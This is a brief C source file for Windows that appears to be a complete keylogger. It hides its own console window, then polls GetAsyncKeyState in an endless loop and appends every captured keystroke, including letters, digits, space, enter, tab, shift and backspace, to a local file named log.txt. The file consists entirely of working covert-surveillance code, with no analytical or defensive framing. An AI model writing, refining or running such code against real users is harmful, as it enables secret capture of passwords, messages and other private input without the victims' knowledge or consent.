#include <stdio.h>
#include <windows.h>
int main(){
ShowWindow(GetConsoleWindow(), SW_HIDE);
FILE*file;
short key;
file= fopen("log.txt","w");
if(file) fclose(file);
while(1){
  Sleep(10);
    for(key = 8; key<=256 ; key++){
    if (GetAsyncKeyState(key) == -32767) {
        file= fopen("log.txt","a+");
        if(file){
        if(key>=65 && key<=90){
          if (GetAsyncKeyState(VK_SHIFT)){
            fprintf(file,"%c" , key);
        }else{
          fprintf(file,"%c",key + 32);
        }
      }
      else if(key>=48 && key <=57) {
        fprintf(file,"%c",key);
      }
        else{
          switch (key){
        
            case VK_SPACE:
        fprintf(file," ");
        break;
        
        case VK_RETURN:
        fprintf(file,"\n");
        break;
       
        case VK_TAB:
        fprintf(file,"\t");
        break;
        
        case VK_SHIFT:
        fprintf(file, "[SHIFT]");
        break;
        
        case VK_BACK:
        fprintf(file, "[BACKSPACE]");
        break;
        }
        }
        fclose(file);
                }
            }
        }
      }
    return 0;
}